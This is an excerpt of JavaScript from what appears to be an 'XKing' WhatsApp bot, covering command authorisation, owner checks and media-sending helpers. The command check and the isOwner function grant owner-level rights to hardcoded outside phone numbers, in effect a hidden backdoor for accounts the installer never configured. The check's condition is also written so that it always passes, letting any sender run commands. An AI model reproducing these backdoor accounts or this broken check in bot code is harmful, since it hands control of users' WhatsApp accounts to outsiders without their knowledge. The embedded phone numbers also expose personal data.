...
// Initialize watchers on first require
initFileWatchers();

// New normalizeJid function
...
const shouldProcessCommand = (serializedMsg) => {
    ...
    const special1 = `2349123721026@s.whatsapp.net`;
    const special2 = `2348100835767@s.whatsapp.net`;
    const sudoJids = sudoCache?.sudo?.map(num => `${num}@s.whatsapp.net`) || [];
    const senderJid = serializedMsg.sender;
    
    if (senderJid === special1 || special2 ||ownerJid || sudoJids.includes(senderJid)) {
        return true;
    }
...
function smsg(sock, m, str) {
    ...
    if (m.key) {
        ...
        m.user = {};
        // Add this inside the smsg function, right after the senderJid is set (around line 130)
m.isOwner = () => {
    const ownerJid = `${configCache.OWNER_NUMBER}@s.whatsapp.net`;
    const sudoJids = sudoCache?.sudo?.map(num => `${num}@s.whatsapp.net`) || [];
    const specialOwners = [
    ...
    return specialOwners.includes(m.sender) || 
           m.sender === ownerJid || 
           sudoJids.includes(m.sender);
};
    ...
    m.send = async (content, opt = { packname: "XKing", author: "XKing" }, type = "text") => {
        switch (type.toLowerCase()) {
            case "text": {
                let msgs = await sock.sendMessage(m.chat, { text: content }, { quoted: m });
            ...
            case "image": {
                if (Buffer.isBuffer(content)) {
                    return await sock.sendMessage(m.chat, { image: content, ...opt }, { ...opt });
                } else if (isUrl(content)) {
                    return sock.sendMessage(m.chat, { image: { url: content }, ...opt }, { ...opt });
                }
            }
            break;
            case "video": {
                if (Buffer.isBuffer(content)) {
                    return await sock.sendMessage(m.chat, { video: content, ...opt }, { ...opt });
                } else if (isUrl(content)) {
                    return await sock.sendMessage(m.chat, { video: { url: content }, ...opt }, { ...opt });
                }
            }
            break;
            case "audio": {
                if (Buffer.isBuffer(content)) {
                    return await sock.sendMessage(m.chat, { audio: content, ...opt }, { ...opt });
                } else if (isUrl(content)) {
                    return await sock.sendMessage(m.chat, { audio: { url: content }, ...opt }, { ...opt });
                }
            }
            break;
            case "template":
                ...
                await sock.relayMessage(m.chat, message, { messageId: optional.key.id, });
            break;
        }
    };
